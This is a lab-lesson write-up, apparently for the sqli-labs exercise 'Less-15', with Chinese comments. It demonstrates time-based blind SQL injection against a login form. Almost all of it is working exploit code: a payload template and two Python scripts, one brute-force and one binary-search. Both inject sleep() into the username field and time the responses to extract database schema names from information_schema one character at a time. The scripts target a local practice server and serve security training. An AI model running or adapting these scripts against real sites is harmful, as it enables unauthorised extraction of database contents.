# Lesson-15
```
时间盲注
```

```
' or (() and sleep(3))-- 
```
穷举 : 
```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 1
error_time = 0.1
# config-end

def getPayload(indexOfResult, indexOfChar, mid):
	# admin' or ()-- 
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))=" + mid + ")"
	payload = {"uname":"' or ((" + payload + ") and sleep(" + str(sleep_time) + "))-- ","passwd":"admin"}
	return payload

def exce(indexOfResult,indexOfChar,queryASCII):
	# content-start
	url = "http://127.0.0.1/Less-15/"
	postData = getPayload(indexOfResult,indexOfChar,queryASCII)
	before_time = time.time()
	requests.post(url, data=postData)
	after_time = time.time()
	# content-end
	use_time = after_time - before_time
	# judge-start
	# 当sleep函数被执行 , 说明查询是正确的 (因为穷举毕竟错误的情况更多 , 要构造SQL语句让正确的情况执行sleep函数从而提高效率)
	# 当使用二分查找的时候 , 控制正确/错误的时候执行sleep函数就不那么重要了
	if abs(use_time) > error_time: 
		return True
	else:
		return False
	# judge-end

def doSearch(indexOfResult,indexOfChar):
	# 根据数据库中出现的字符的频率顺序重新构造列表进行查询
	order = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','_','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',' ','!','"','#','$','%','&','\'','(',')','*','+',',','-','.','/','0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?','@','[','\\',']','^','`','{','|','}','~']
	for queryChar in order:
		queryASCII = ord(queryChar)
		if exce(str(indexOfResult),str(indexOfChar + 1), str(queryASCII)):
			return chr(queryASCII)
	return chr(1)

def search():
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		for j in range(32): # 结果的长度
			counter += 1
			temp = doSearch(i, j) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()
```
二分 : 
```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 1
error_time = 0.1
# config-end

def getPayload(indexOfResult, indexOfChar, mid):
	# admin' or ()-- 
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"
	payload = {"uname":"' or ((" + payload + ") and sleep(" + str(sleep_time) + "))-- ","passwd":"admin"}
	return payload

def exce(indexOfResult,indexOfChar,queryASCII):
	# content-start
	url = "http://127.0.0.1/Less-15/"
	postData = getPayload(indexOfResult,indexOfChar,queryASCII)
	print postData
	before_time = time.time()
	requests.post(url, data=postData)
	after_time = time.time()
	# content-end
	use_time = after_time - before_time
	# judge-start
	# 当sleep函数被执行 , 说明查询是正确的 (因为穷举毕竟错误的情况更多 , 要构造SQL语句让正确的情况执行sleep函数从而提高效率)
	# 当使用二分查找的时候 , 控制正确/错误的时候执行sleep函数就不那么重要了
	if abs(use_time) > error_time: 
		return True
	else:
		return False
	# judge-end

def doubleSearch(indexOfResult,indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def search():
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		for j in range(32): # 结果的长度
			counter += 1
			temp = doubleSearch(i, j, 0, 128) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()
```
